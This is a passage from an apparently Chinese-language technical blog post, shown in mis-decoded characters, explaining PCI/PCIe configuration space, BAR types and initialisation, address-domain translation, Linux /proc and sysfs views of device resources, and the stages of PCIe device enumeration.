Chengdu Haiguang IC Design Co., Ltd.<br>SDevice:        NTBCCP<br>NUMANode:       7<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿˜å¯ä»¥ç›´æ¥ä½¿ç”¨ <code>-x</code> å‚æ•°æ¥æŸ¥çœ‹ PCI è®¾å¤‡çš„é…ç½®ç©ºé—´ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@compute01:~# lspci -s e2:00.1 -x<br>e2:00.1 Encryption controller: Chengdu Haiguang IC Design Co., Ltd. NTBCCP<br>00: 94 1d 68 14 07 04 10 00 00 00 80 10 00 00 80 00<br>10: 00 00 00 00 00 00 00 00 00 00 c0 bc 00 00 00 00<br>20: 00 00 00 00 00 00 d0 bc 00 00 00 00 94 1d 68 14<br>30: 00 00 00 00 48 00 00 00 00 00 00 00 07 01 00 00<br></code></pre></td></tr></table></figure><p>åœ¨ Linux å½“ä¸­æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ procfs æˆ– sysfs è¿™æ ·çš„æ–‡ä»¶ç³»ç»Ÿæ¥æŸ¥çœ‹è®¾å¤‡çš„ç›¸å…³é…ç½®ä¿¡æ¯ï¼Œä¾‹å¦‚é€šè¿‡ <code>/proc/bus/pci/e2/00.1</code> æ–‡ä»¶æˆ‘ä»¬åŒæ ·å¯ä»¥æŸ¥çœ‹ PCI è®¾å¤‡çš„é…ç½®ç©ºé—´ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@compute01:~# cat /proc/bus/pci/e2/00.1 | xxd<br>00000000: 941d 6814 0704 1000 0000 8010 0000 8000  ..h.............<br>00000010: 0000 0000 0000 0000 0000 c0bc 0000 0000  ................<br>00000020: 0000 0000 0000 d0bc 0000 0000 941d 6814  ..............h.<br>00000030: 0000 0000 4800 0000 0000 0000 0701 0000  ....H...........<br>00000040: 0000 0000 0000 0000 0950 0800 941d 6814  .........P....h.<br>00000050: 0164 0300 0800 0000 0000 0000 0000 0000  .d..............<br>00000060: 0000 0000 10a0 0200 a18f 0000 1029 0900  .............)..<br>00000070: 030d 4000 4000 0311 0000 0000 0000 0000  ..@.@...........<br></code></pre></td></tr></table></figure><p>é€šè¿‡ <code>/sys/devices/pci0000:e2/0000:e2:00.1</code> ä¸‹çš„å…¶ä»–æ–‡ä»¶ä¹Ÿå¯ä»¥è®¿é—®è¯¥è®¾å¤‡çš„ä¸€äº›å…¶ä»–èµ„æºä¿¡æ¯ï¼ˆä¾‹å¦‚é€šè¿‡ <code>resource0</code> å¯ä»¥ç›´æ¥è®¿é—® MMIO ç©ºé—´ï¼Œ<code>resource1</code> åˆ™ä¸ºå…¶ PMIO ç©ºé—´ï¼‰</p><h1 id="PCI-Base-Address-register">PCI Base Address register</h1><p>BARï¼ˆBase Address Registerï¼‰ç©ºé—´æ˜¯åœ¨PCIeè®¾å¤‡ä¸­çš„ã€‚BARæ˜¯ä¸€ç»„ç‰¹æ®Šçš„å¯„å­˜å™¨ï¼Œç”¨äºå®šä¹‰è®¾å¤‡çš„å†…å­˜å’ŒI/Oåœ°å€ç©ºé—´ã€‚è¿™äº›åœ°å€æ˜¯è®¾å¤‡å’Œä¸»æœºç³»ç»Ÿé€šä¿¡çš„åŸºç¡€ã€‚</p><blockquote><p>ä¸ºä»€ä¹ˆéœ€è¦BARï¼Ÿ</p><p>è®¾å¤‡å†…éƒ¨ä½¿ç”¨ RAM æˆ–è€…å¯„å­˜å™¨æ¥å®ç°çš„ä¸€äº›åŠŸèƒ½ï¼Œæœ‰æ—¶éœ€è¦è®©å¤–éƒ¨æ¥è®¿é—®ï¼Œæ¯”å¦‚ç½‘å¡çš„é˜Ÿåˆ—æè¿°ç¬¦ï¼ŒDMA æ§åˆ¶å™¨ç­‰ï¼Œéœ€è¦è®©ç³»ç»Ÿæ¥æ¢ä½œå’Œå†™å…¥æ‰èƒ½å·¥ä½œï¼›æˆ–è€… GPU çš„æ˜¾å­˜ RAM éœ€è¦ç³»ç»Ÿä¼ è¾“æ•°æ®ï¼Œç„¶å GPU æ‰èƒ½æ¸²æŸ“å’Œè®¡ç®—ã€‚</p><p>CPUå’ŒDMAæ§åˆ¶å™¨é€šè¿‡ç‰©ç†åœ°å€è®¿é—®å†…å­˜æˆ–è®¾å¤‡ï¼Œè¿™äº›å†…éƒ¨çš„ RAM æˆ–è€…å¯„å­˜å™¨è¦è¢«è®¿é—®ï¼Œå°±éœ€è¦ç»Ÿä¸€å¯»å€ï¼Œä¹Ÿå°±æ˜¯ç»Ÿä¸€æ˜ å°„åˆ°ä¸»æœºçš„ç‰©ç†åœ°å€ç©ºé—´ï¼ŒBARçš„ä½œç”¨æ˜¯å°†è¿™äº›è®¾å¤‡èµ„æºæ˜ å°„åˆ°ä¸»æœºå…±äº«çš„ç‰©ç†åœ°å€ç©ºé—´ï¼ˆå¦‚å†…å­˜åœ°å€æˆ–I/Oåœ°å€ï¼‰ã€‚</p><p><strong>BAR é‡Œé¢åŸæœ¬å­˜åœ¨çš„å€¼ï¼Œå‘Šè¯‰ä¸»æœºè¯¥è®¾å¤‡éœ€è¦å¤šå¤§çš„å†…å­˜</strong>ï¼Œåç»­CPUæˆ–DMAè®¿é—®è¯¥åœ°å€æ—¶ï¼ŒPCIeæ€»çº¿ä¼šå°†å…¶è·¯ç”±åˆ°å¯¹åº”è®¾å¤‡ã€‚</p></blockquote><h2 id="BARçš„ç±»å‹">BARçš„ç±»å‹</h2><p>æˆ‘ä»¬éƒ½çŸ¥é“ä¸è®¾å¤‡é€šä¿¡æœ‰ä¸¤ç§æ–¹å¼ï¼šMMIO ä¸ Port IOï¼Œç›¸åº”åœ° BAR çš„æ ¼å¼ä¹Ÿæœ‰å¦‚ä¸‹ä¸¤ç§ï¼š</p><ul><li><strong>Memory-Mapped I/O (MMIO) BARï¼š</strong> è¿™æ˜¯æœ€å¸¸è§å’Œæ¨èçš„ç±»å‹ã€‚å®ƒè¯·æ±‚å°†è®¾å¤‡èµ„æºï¼ˆå¯„å­˜å™¨ã€å†…å­˜ï¼‰æ˜ å°„åˆ°ç³»ç»Ÿçš„ç‰©ç†<strong>å†…å­˜åœ°å€ç©ºé—´</strong>ã€‚CPU å’Œ DMA å¼•æ“ä½¿ç”¨æ™®é€šçš„<code>mov</code>ç­‰å†…å­˜è®¿é—®æŒ‡ä»¤æ¥è¯»å†™è¿™äº›èµ„æºï¼Œå°±åƒè®¿é—®æ™®é€šå†…å­˜ä¸€æ ·ï¼ˆè™½ç„¶å®é™…è®¿é—®çš„æ˜¯è®¾å¤‡ï¼‰ã€‚MMIO BAR è¿˜å¯ä»¥ç»†åˆ†ä¸ºï¼š<ul><li><strong>32-bit BARï¼š</strong> è¯·æ±‚32ä½åœ°å€ç©ºé—´ï¼ˆæœ€å¤§4GBä»¥ä¸‹ï¼‰ã€‚</li><li><strong>64-bit BARï¼š</strong> è¯·æ±‚64ä½åœ°å€ç©ºé—´ï¼ˆå¤§äº4GBï¼‰ã€‚ä¸€ä¸ª64ä½ BAR ä¼šå ç”¨<strong>ä¸¤ä¸ª</strong>è¿ç»­çš„32ä½ BAR ä½ç½®ï¼ˆBAR[n] å­˜æ”¾ä½32ä½åœ°å€ï¼ŒBAR[n+1] å­˜æ”¾é«˜32ä½åœ°å€ï¼‰ã€‚</li><li><strong>Prefetchable vs. Non-Prefetchableï¼š</strong> æŒ‡ç¤ºè¯¥å†…å­˜åŒºåŸŸçš„å†…å®¹æ˜¯å¦å¯ä»¥è¢«CPUé¢„å–æˆ–ç¼“å­˜ï¼ˆé€šå¸¸è®¾å¤‡ä¸Šçš„å†…å­˜ç¼“å†²åŒºæ˜¯å¯é¢„å–çš„ï¼Œå¯„å­˜å™¨æ˜¯ä¸å¯é¢„å–çš„ï¼‰ã€‚</li></ul></li><li><strong>I/O Space BARï¼š</strong> è¯·æ±‚å°†è®¾å¤‡èµ„æºï¼ˆé€šå¸¸æ˜¯å¯„å­˜å™¨ï¼‰æ˜ å°„åˆ°ç³»ç»Ÿçš„<strong>I/Oåœ°å€ç©ºé—´</strong>ï¼ˆx86æ¶æ„ç‰¹æœ‰çš„ã€è¾ƒå°çš„ç‹¬ç«‹åœ°å€ç©ºé—´ï¼‰ã€‚CPU éœ€è¦ä½¿ç”¨ä¸“é—¨çš„ <code>in</code> å’Œ <code>out</code> æŒ‡ä»¤æ¥è®¿é—®è¿™äº›èµ„æºã€‚ç°ä»£è®¾å¤‡å’Œæ“ä½œç³»ç»Ÿ<strong>å¼ºçƒˆå€¾å‘äºä½¿ç”¨ MMIO</strong>ï¼ŒI/O BAR å·²å¾ˆå°‘è§ã€‚</li></ul><h2 id="BARçš„åˆå§‹åŒ–">BARçš„åˆå§‹åŒ–</h2><p>é€šè¿‡ BAR è¿›è¡Œèµ„æºåˆ†é…çš„å…·ä½“è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ul><li><p>BARä¸­ä½ä½ä¼šåœ¨PCIå¤ä½æ—¶ï¼Œ<strong>é€šè¿‡å°†ä½ä½çš„ bit è®¾ç½®ä¸º read only çš„ 0 æ¥æ ‡è¯†æœ€å°åœ°å€ç©ºé—´å¤§å°</strong>ï¼Œä½ä½ä¹Ÿå°±ä¸å¯å†™å…¥å¹¶ä¸”ä¸º0äº†ã€‚</p></li><li><p>Host è½¯ä»¶ (BIOS æˆ–è€…æ“ä½œç³»ç»Ÿ) è¯»å–è®¾å¤‡çš„ BAR ä¸ªæ•°å’Œå¤§å°ã€‚Host é€šè¿‡å‘BAR å†™å…¨ 1ï¼Œç„¶åè¯»å–è¿”å›å€¼ã€‚è®¾å¤‡ç¡¬ä»¶ä¼šè¿”å›ä¸€ä¸ªæ©ç ï¼Œå…¶ä¸­ä½ä½è¿ç»­çš„<code>0</code>è¡¨ç¤ºæ‰€éœ€ç©ºé—´çš„å¤§å°ï¼ˆå¦‚è¿”å›<code>0xFFFF0000</code>è¡¨ç¤ºéœ€è¦64KBç©ºé—´ï¼‰ã€‚å¦‚æœè¿”å› 0, è¯´æ˜æ²¡æœ‰å®ç° BARã€‚</p></li><li><p>ç³»ç»Ÿæ ¹æ®æ¢æµ‹ç»“æœï¼Œåœ¨ç‰©ç†åœ°å€ç©ºé—´ä¸­æ‰¾åˆ°ä¸€ä¸ªæœªä½¿ç”¨çš„ã€å¯¹é½çš„åœ°å€èŒƒå›´ï¼ˆä¾‹å¦‚<code>0x50000000</code>ï¼‰ï¼Œå°†å…¶å†™å…¥BARã€‚æ­¤åœ°å€æˆä¸ºè®¾å¤‡èµ„æºçš„â€œå…¥å£â€ã€‚é…ç½®å®Œæˆåï¼Œè®¾å¤‡å†…éƒ¨çš„å¯„å­˜å™¨æˆ–ç¼“å†²åŒºï¼ˆå¦‚<code>0x00</code>~<code>0xFF</code>ï¼‰ä¼šè¢«æ˜ å°„åˆ°ä¸»æœºç‰©ç†åœ°å€çš„è¿ç»­èŒƒå›´ã€‚</p></li></ul><h2 id="å¤„ç†å™¨åŸŸä¸-PCI-åŸŸé—´è®¿é—®">å¤„ç†å™¨åŸŸä¸ PCI åŸŸé—´è®¿é—®</h2><p>éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œ<strong>å¤„ç†å™¨ä½¿ç”¨å­˜å‚¨å™¨åŸŸçš„åœ°å€ï¼Œè€Œ BAR å¯„å­˜å™¨å­˜æ”¾ PCI æ€»çº¿åŸŸçš„åœ°å€</strong>ï¼Œå› æ­¤å¤„ç†å™¨ä¸èƒ½ç›´æ¥é€šè¿‡ <code>BAR + offset</code> çš„æ–¹å¼è®¿é—® PCI è®¾å¤‡çš„ BAR ç©ºé—´ï¼Œè€Œåº”å½“è¦<strong>å°† PCI æ€»çº¿åŸŸçš„åœ°å€è½¬æ¢ä¸ºå­˜å‚¨å™¨åŸŸçš„åœ°å€</strong></p><p>ç”±æ­¤ï¼ŒPCI BAR ä¸­åœ°å€åœ¨å­˜å‚¨å™¨åŸŸä¸­çš†æœ‰ç€ç›¸åº”çš„æ˜ åƒï¼Œå½“å¤„ç†å™¨è®¿é—® PCI è®¾å¤‡çš„åœ°å€ç©ºé—´æ—¶ï¼Œé¦–å…ˆè®¿é—®è¯¥è®¾å¤‡åœ¨å­˜å‚¨å™¨åŸŸä¸­çš„åœ°å€ç©ºé—´ï¼Œä¹‹åé€šè¿‡ HOST ä¸»æ¡¥å°†å­˜å‚¨å™¨åŸŸä¸Šåœ°å€ç©ºé—´è½¬æ¢ä¸º PCI æ€»çº¿åŸŸçš„åœ°å€ç©ºé—´ï¼Œæœ€åé€šè¿‡ PCI æ€»çº¿å°†æ•°æ®å‘é€åˆ°æŒ‡å®šçš„è®¾å¤‡ä¸­</p><p>åä¹‹äº¦ç„¶ï¼Œå½“ PCI è®¾å¤‡éœ€è¦è®¿é—®å­˜å‚¨å™¨åŸŸçš„åœ°å€ç©ºé—´æ—¶ï¼ˆDMA æ“ä½œï¼‰ï¼Œé¦–å…ˆéœ€è¦è®¿é—®è¯¥å­˜å‚¨å™¨åœ°å€ç©ºé—´æ‰€å¯¹åº”çš„ PCI æ€»çº¿ç©ºé—´ï¼Œä¹‹åé€šè¿‡ HOST ä¸»æ¡¥å°†å…¶è½¬æ¢ä¸ºå­˜å‚¨å™¨åœ°å€ç©ºé—´ï¼Œå†ç”± DDR æ§åˆ¶å™¨å®Œæˆå¯¹å­˜å‚¨å™¨çš„è¯»å†™</p><blockquote><p>ä¾‹å¦‚ï¼š</p><p>CPUæˆ–DMAæ§åˆ¶å™¨å‘å‡ºPCIè®¾å¤‡çš„ç‰©ç†åœ°å€ï¼ˆå¦‚<code>0x50000008</code>ï¼Œåœ°å€<code>0x50000000</code>+åç§»<code>0x08</code>ï¼‰,HOST ä¸»æ¡¥ä¼šå°†å…¶è½¬æ¢ä¸º PCI æ€»çº¿åŸŸåœ°å€ï¼ˆå¦‚ <code>0xE000_0008</code>ï¼‰ï¼Œå†é€šè¿‡ PCI æ€»çº¿å‘é€ç»™è®¾å¤‡ã€‚åŒæ ·ï¼Œå½“è®¾å¤‡æ‰§è¡Œ DMA å†™å…¥å†…å­˜æ—¶ï¼Œå®ƒä½¿ç”¨ PCI æ€»çº¿åŸŸåœ°å€ï¼ˆå¦‚ <code>0xE000_0000</code>ï¼‰ï¼ŒHOST ä¸»æ¡¥ä¼šå°†å…¶è½¬æ¢ä¸ºå­˜å‚¨å™¨åŸŸåœ°å€ï¼ˆå¦‚ <code>0x5000_0000</code>ï¼‰ï¼Œæœ€ç»ˆç”±å†…å­˜æ§åˆ¶å™¨å®Œæˆå†™å…¥ã€‚</p></blockquote><p>å¦‚å‰é¢æè¿°ï¼ŒPCIEé…ç½®ç©ºé—´ä¸­ä¸åŒtypeä¸‹çš„BARé…ç½®ç©ºé—´ä¸åŒï¼ŒType0æœ‰6ä¸ªå¯é…ç½®BARç©ºé—´ï¼ŒType1æœ‰2ä¸ªå¯é…ç½®BARç©ºé—´ã€‚</p><h1 id="PCI-è®¾å¤‡å†…å­˜-ç«¯å£ç©ºé—´ä¸è®¿é—®æ–¹å¼">PCI è®¾å¤‡å†…å­˜ &amp; ç«¯å£ç©ºé—´ä¸è®¿é—®æ–¹å¼</h1><p>å‰é¢æˆ‘ä»¬è®²äº† PCI è®¾å¤‡ä¸ç‰¹æ€§å’Œé…ç½®ç›¸å…³çš„é…ç½®ç©ºé—´ï¼Œç°åœ¨æˆ‘ä»¬æ¥çœ‹ä¸ PCI è®¾å¤‡ä¸å®é™…æ“ä½œç›¸å…³çš„å†…å­˜æ˜ å°„ç©ºé—´ä¸ç«¯å£æ˜ å°„ç©ºé—´ã€‚</p><p>æ‰€æœ‰ IO è®¾å¤‡çš„å†…å­˜ä¸ç«¯å£ç©ºé—´éœ€è¦è¢«æ˜ å°„åˆ°å¯¹åº”çš„åœ°å€ç©ºé—´/ç«¯å£ç©ºé—´ä¸­æ‰èƒ½è®¿é—®ï¼Œè¿™éœ€è¦å ç”¨éƒ¨åˆ†çš„å†…å­˜åœ°å€ç©ºé—´ä¸ç«¯å£åœ°å€ç©ºé—´ï¼Œä¸Šä¸€ç« å·²ç»æåˆ°è¿‡ä¸¤ç§æ˜ å°„å¤–è®¾èµ„æºçš„æ–¹å¼<strong>MMIO</strong>å’Œ<strong>PMIO</strong>ã€‚</p><p>å®Œæˆæ˜ å°„ä¹‹åé€šè¿‡ç›¸åº”çš„å†…å­˜/ç«¯å£è®¿é—®åˆ°çš„ä¾¿æ˜¯ PCI è®¾å¤‡çš„å†…å­˜/ç«¯å£åœ°å€ç©ºé—´ã€‚</p><p>é€šè¿‡ procfs çš„ <code>/proc/iomem</code> æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹ç‰©ç†åœ°å€ç©ºé—´çš„æƒ…å†µï¼Œå…¶ä¸­æˆ‘ä»¬ä¾¿èƒ½çœ‹åˆ°å„ç§è®¾å¤‡æ‰€å ç”¨çš„åœ°å€ç©ºé—´</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@compute01:~# cat /proc/iomem<br>00000000-00000fff : Reserved<br>00001000-000977ff : System RAM<br>00097800-0009ffff : Reserved<br>000a0000-000bffff : PCI Bus 0000:00<br>000c0000-000dffff : PCI Bus 0000:00<br>000e0000-000fffff : Reserved<br>  000f0000-000fffff : System ROM<br>00100000-7a3dffff : System RAM<br>7a3e0000-7a6bdfff : Reserved<br>7a6be000-7a7bdfff : ACPI Non-volatile Storage<br>7a7be000-7a7fdfff : ACPI Tables<br>7a7fe000-7bffdfff : System RAM<br>7bffe000-7fffffff : Reserved<br>bcc00000-bf1fffff : PCI Bus 0000:e0<br>  bcc00000-bcdfffff : PCI Bus 0000:e2<br>    bcc00000-bccfffff : 0000:e2:00.1<br>    bcd00000-bcd01fff : 0000:e2:00.1<br></code></pre></td></tr></table></figure><p>é€šè¿‡ procfs çš„ <code>/proc/ioports</code> æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹ IO ç«¯å£æƒ…å†µï¼Œå…¶ä¸­ä¾¿åŒ…æ‹¬å„ç§è®¾å¤‡å¯¹åº”çš„ PMIO ç«¯å£ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@compute01:~# cat /proc/ioports<br>0000-02f7 : PCI Bus 0000:00<br>  0000-001f : dma1<br>  0020-0021 : pic1<br>  0040-0043 : timer0<br>  0050-0053 : timer1<br>  0060-0060 : keyboard<br>  0061-0061 : PNP0800:00<br>  0064-0064 : keyboard<br>  0070-0071 : rtc0<br>  0080-008f : dma page reg<br>  00a0-00a1 : pic2<br>  00c0-00df : dma2<br>  00f0-00ff : fpu<br>0300-03af : PCI Bus 0000:00<br>03b0-03df : PCI Bus 0000:00<br>  03c0-03df : vesafb<br>03f8-03ff : serial<br>0400-0cf7 : PCI Bus 0000:00<br>  040b-040b : pnp 00:02<br>  04d0-04d1 : pnp 00:02<br>  04d6-04d6 : pnp 00:02<br>  0800-089f : pnp 00:02<br>    0800-0803 : ACPI PM1a_EVT_BLK<br>    0804-0805 : ACPI PM1a_CNT_BLK<br>    0808-080b : ACPI PM_TMR<br>    0820-0827 : ACPI GPE0_BLK<br>  0900-090f : pnp 00:02<br>  0910-091f : pnp 00:02<br>  0b00-0b0f : pnp 00:02<br>    0b00-0b08 : piix4_smbus<br></code></pre></td></tr></table></figure><h1 id="æ€»ç»“PCIEè®¾å¤‡è¯†åˆ«æµç¨‹">æ€»ç»“PCIEè®¾å¤‡è¯†åˆ«æµç¨‹</h1><h2 id="ç¬¬ä¸€é˜¶æ®µï¼šPCIe-è®¾å¤‡æ¥å…¥ä¸æ€»çº¿å‘ç°">ç¬¬ä¸€é˜¶æ®µï¼šPCIe è®¾å¤‡æ¥å…¥ä¸æ€»çº¿å‘ç°</h2><p>å½“ä¸€å— PCIe è®¾å¤‡è¢«æ’å…¥ä¸»æ¿æ—¶ï¼š</p><ol><li>PCIe Root Complexï¼ˆRCï¼‰é€šè¿‡ LTSSMï¼ˆLink Training and Status State Machineï¼‰ä¸è®¾å¤‡ç«¯å£å»ºç«‹ç‰©ç†é“¾è·¯ï¼›</li><li>è®¾å¤‡è¿›å…¥ L0 çŠ¶æ€ï¼Œè¡¨ç¤ºé“¾è·¯å‡†å¤‡å°±ç»ªï¼›</li><li>è¿™æ—¶è®¾å¤‡å°šæœªæœ‰åœ°å€ï¼Œä¹Ÿä¸åœ¨ä¸»æœºå†…å­˜æ˜ å°„èŒƒå›´å†…ï¼Œä»…åœ¨ RC ä¾§å¯æ¢æµ‹ï¼›</li></ol><p>è¿™ä¸€æ­¥ <strong>æ˜¯è‡ªåŠ¨å‘ç”Ÿçš„</strong>ï¼Œä¸ä¾èµ– CPU æˆ–æ“ä½œç³»ç»Ÿå‚ä¸ï¼Œå®Œå…¨æ˜¯ç¡¬ä»¶å±‚å®Œæˆçš„ã€‚</p><blockquote><p>RC é€šå¸¸æ˜¯ä¸»æ¿èŠ¯ç‰‡ç»„çš„ä¸€éƒ¨åˆ†ï¼ˆæ¯”å¦‚ Intel çš„ PCHï¼‰ï¼Œæˆ–è€…ç›´æ¥é›†æˆåœ¨ CPU é‡Œï¼Œå®ƒæš´éœ²å‡ºå¤šä¸ª <strong>PCIe Root Port</strong>ï¼Œæ¯ä¸ª Root Port å¯ä»¥è¿æ¥ä¸€ä¸ª PCIe è®¾å¤‡æˆ– switchã€‚è´Ÿè´£<strong>è®¾å¤‡æšä¸¾ã€åœ°å€åˆ†é…ã€é…ç½®ã€äº‹åŠ¡å¤„ç†</strong>ã€‚æ˜¯è¿æ¥ CPU/å†…å­˜å­ç³»ç»Ÿä¸ PCIe è®¾å¤‡çš„&quot;ç½‘å…³&quot;ã€‚</p></blockquote><blockquote><p>å½“ä½ æ’ä¸Šä¸€ä¸ª PCIe è®¾å¤‡åï¼Œ<strong>ä¸»æœºä¸è®¾å¤‡ä¹‹é—´çš„ç‰©ç†é“¾è·¯è¿˜æœªå»ºç«‹</strong>ï¼Œå®ƒä»¬ä¹‹é—´è¦ç»è¿‡ä¸€ç³»åˆ—æ¡æ‰‹ã€è®­ç»ƒã€ä¿¡å·åŒæ­¥è¿‡ç¨‹æ‰èƒ½é€šä¿¡ã€‚è¿™ä¸ªè¿‡ç¨‹å°±æ˜¯ç”± <strong>LTSSM</strong> æ§åˆ¶çš„ï¼Œç±»ä¼¼äºç½‘ç»œè¿æ¥å»ºç«‹ä¸­çš„â€œä¸‰æ¬¡æ¡æ‰‹â€ã€‚LTSSMè¿˜å¯ä»¥å®æ—¶ç»´æŒä¿¡å·å®Œæ•´æ€§å¹¶åœ¨çº³ç§’çº§å†…æ¢å¤é“¾è·¯é”™è¯¯ã€‚</p></blockquote><h2 id="ç¬¬äºŒé˜¶æ®µï¼šé€šè¿‡æšä¸¾å‘ç°è®¾å¤‡">ç¬¬äºŒé˜¶æ®µï¼šé€šè¿‡æšä¸¾å‘ç°è®¾å¤‡</h2><p>ä¸»æœºå¹¶ä¸çŸ¥é“PCIeè®¾å¤‡å…·ä½“åœ¨å“ªï¼Œä½†æ˜¯ä¸»æœºå¯ä»¥æ„é€ é…ç½®ä¸€ä¸ªä¸€ä¸ªçš„å»æ¢æµ‹ï¼Œä»<strong>æ€»çº¿0ã€è®¾å¤‡0ã€åŠŸèƒ½0ï¼ˆBDF 0:0.0ï¼‰</strong> å¼€å§‹ï¼Œå‘æ¯ä¸ªå¯èƒ½çš„BDFï¼ˆBus/Device/Functionï¼‰å‘é€é…ç½®è¯»è¯·æ±‚ã€‚å¦‚æœæ²¡æœ‰è®¾å¤‡åˆ™è¯»è¯·æ±‚è¶…æ—¶ï¼Œå¦‚æœéƒ½ä¼šæœ‰æ•ˆçš„Vendor ID å’Œ Device IDï¼Œä¸»æœºå°±çŸ¥é“è¿™é‡Œæœ‰ä¸€ä¸ªçœŸå®çš„è®¾å¤‡æˆ–Bridgeå­˜åœ¨ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">TLP: CFG Read Type 0 â†’ BDF = 00:00.0, Offset = 0x00 (Vendor ID)<br></code></pre></td></tr></table></figure><blockquote><p>ç–‘æƒ‘ï¼šä¸»æœºä¸çŸ¥é“PCIeçš„åœ°å€å…¶å®å°±æ— æ³•è®¿é—®PCIeè®¾å¤‡ï¼Œä¸ºä»€ä¹ˆè¿˜èƒ½é€šè¿‡BDFæšä¸¾æ¥è®¿é—®åˆ°è®¾å¤‡ï¼Ÿ</p><p>è¿™é‡Œå…¶å®æ˜¯CPUå‘<code>CONFIG_ADDRESS</code>å†™å…¥ä¸€ä¸ªæ ¼å¼åŒ–çš„å€¼ï¼ˆåŒ…å«B, D, F, Register Numberï¼‰åï¼Œå†å¯¹<code>CONFIG_DATA</code>æ‰§è¡ŒI/Oè¯»/å†™æ“ä½œæ—¶ï¼ŒRCç¡¬ä»¶ä¼š<strong>è‡ªåŠ¨</strong>å°†è¿™ä¸ªæ“ä½œè½¬æ¢æˆä¸€ä¸ª <strong>é…ç½®äº‹åŠ¡TLP (Configuration Read/Write TLP)</strong>ï¼Œè€ŒRCèƒ½é€šè¿‡PCIeæ€»çº¿å‘é€TLPï¼Œä»è€Œèƒ½æ‰¾åˆ°è®¾å¤‡ã€‚</p></blockquote><h2 id="ç¬¬ä¸‰é˜¶æ®µï¼šèµ„æºåˆ†é…">ç¬¬ä¸‰é˜¶æ®µï¼šèµ„æºåˆ†é…</h2><p>æšä¸¾åˆ°è®¾å¤‡åï¼ŒRC è¯»å–å…¶é…ç½®ç©ºé—´ä¸­çš„ BAR å¯„å­˜å™¨ï¼ˆä½äº offset 0x10 å¼€å§‹ï¼‰ï¼Œä¸»æœºä¼šå°è¯•å‘è¯¥ BAR å†™å…¥å…¨ 1ï¼ˆ0xFFFFFFFFï¼‰ï¼Œè®¾å¤‡æŒ‰åè®®å±è”½æ‰å…¶ä½ä½ï¼ˆå¦‚ä½ 4 ä½ï¼‰ï¼Œè¿”å›å…¶æ‰€éœ€åœ°å€å¤§å°æ©ç ï¼Œä¸»æœºç”¨è¯¥è¿”å›å€¼è®¡ç®—å‡ºæ‰€éœ€èµ„æºå¤§å°ã€‚</p><p>ä¸»æœºä¸ºæ­¤è®¾å¤‡ <strong>åˆ†é…æœªè¢«å ç”¨çš„å†…å­˜ç©ºé—´</strong>ï¼Œå¹¶ç»´æŠ¤ä¸€ä¸ªå…¨å±€çš„ <strong>åœ°å€ç©ºé—´æ˜ å°„è¡¨</strong>ã€‚éšåä¸»æœºå°†åˆ†é…å¥½çš„åœ°å€é‡æ–°å†™å…¥ BARï¼Œå‘Šè¯‰è®¾å¤‡ï¼šâ€œä½ åº”è¯¥ç›‘å¬è¿™ä¸ªç‰©ç†åœ°å€èŒƒå›´çš„è®¿é—®ã€‚â€</p><p>ä¸»æœºä¸ºè®¾å¤‡åˆ†é…ä¸­æ–­ï¼Œä¸»æœºé€šè¿‡è®¾å¤‡çš„MSI/MSI-X Capabilityç»“æ„ï¼Œåˆ†é…ä¸€ä¸ªæˆ–å¤šä¸ª<strong>ä¸­æ–­å‘é‡å·</strong>ï¼ˆä»£è¡¨ç‰¹å®šçš„ä¸­æ–­å¤„ç†ç¨‹åºï¼‰ã€‚ä¸»æœºå°†<strong>ç›®æ ‡åœ°å€</strong>ï¼ˆé€šå¸¸æ˜¯ä¸­æ–­æ§åˆ¶å™¨ç‰¹å®šçš„åœ°å€ï¼‰å’Œ<strong>æ•°æ®å€¼</strong>ï¼ˆåŒ…å«å‘é‡å·ç­‰ä¿¡æ¯ï¼‰å†™å…¥è®¾å¤‡çš„MSI/MSI-Xé…ç½®å¯„å­˜å™¨ã€‚</p><p><strong>å½“è®¾å¤‡éœ€è¦ä¸­æ–­æ—¶ï¼Œå®ƒä¸å†æ‹‰ä¿¡å·çº¿ï¼Œè€Œæ˜¯å‘é…ç½®å¥½çš„ç›®æ ‡åœ°å€å†™å…¥é…ç½®å¥½çš„æ•°æ®å€¼ï¼ˆå‘èµ·ä¸€ä¸ªMemory Write TLPï¼‰ã€‚</strong> ä¸­æ–­æ§åˆ¶å™¨æ•è·è¿™ä¸ªå†™æ“ä½œï¼Œæ 